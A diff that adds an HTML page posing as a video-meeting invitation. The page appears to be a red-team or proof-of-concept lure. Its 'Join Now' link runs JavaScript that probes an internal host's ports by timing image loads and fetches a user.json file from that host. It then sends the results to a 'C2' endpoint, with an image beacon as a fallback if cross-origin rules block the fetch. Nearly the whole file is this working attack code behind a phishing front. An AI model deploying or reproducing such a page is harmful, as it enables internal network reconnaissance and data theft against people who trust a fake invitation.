@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Meeting Invitation</title>
+</head>
+<body>
+  <h2>Your Meeting Invitation Awaits</h2>
+  <p>Click to join your video call now → <a href="javascript:void(0)" onclick="startScan()">Join Now</a></p>
+  <script>
+    function startScan() {
+      const host = "<insert_the_hostname>.local";
+
+      console.log("🎯 Leaked Hostname:", host);
+
+      let openPorts = [];
+      const scanPort = (host, port) => {
+        return new Promise((resolve) => {
+          const img = new Image();
+          const start = Date.now();
+          img.onload = img.onerror = () => {
+            const time = Date.now() - start;
+            resolve(time < 100 ? "Open" : "Closed");
+          };
+          img.src = `http://${host}:${port}`;
+        });
+      };
+
+      const scanAll = async () => {
+        const ports = [80, 443];
+        for (const port of ports) {
+          const result = await scanPort(host, port);
+          console.log(`📡 ${host}:${port} → ${result}`);
+          if (result === "Open") openPorts.push(port);
+        }
+
+        if (openPorts.includes(80)) {
+          // Try to fetch JSON via fetch()
+          fetch(`http://${host}:9000/user.json`)
+            .then(res => {
+              if (res.ok) return res.json();
+              else throw new Error("Not OK");
+            })
+            .then(data => {
+              const exfil = {
+                host,
+                ports: openPorts,
+                leakedData: data
+              };
+              console.log("🚨 Internal Data Leaked via Fetch:", exfil);
+
+              fetch("http://127.0.0.1:5000/report", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(exfil)
+              })
+              .then(() => console.log("📤 Exfil sent to C2"))
+              .catch(err => console.error("📛 Failed to send data:", err));
+            })
+            .catch(() => {
+              // Fallback: beacon if direct fetch fails due to CORS
+              const beacon = new Image();
+              beacon.onload = () => {
+                console.log("🟢 Beacon confirmed: Internal file accessible");
+
+                // Send beacon to attacker (Redhound) server
+                const img2 = new Image();
+                img2.src = "http://127.0.0.1:5000/beacon?host=" + encodeURIComponent(host) + "&status=file_accessible";
+              };
+              beacon.src = `http://${host}/user.json`;
+            });
+           
+        }
+      };
+
+      scanAll();
+    }
+  </script>
+</body>
+</html>
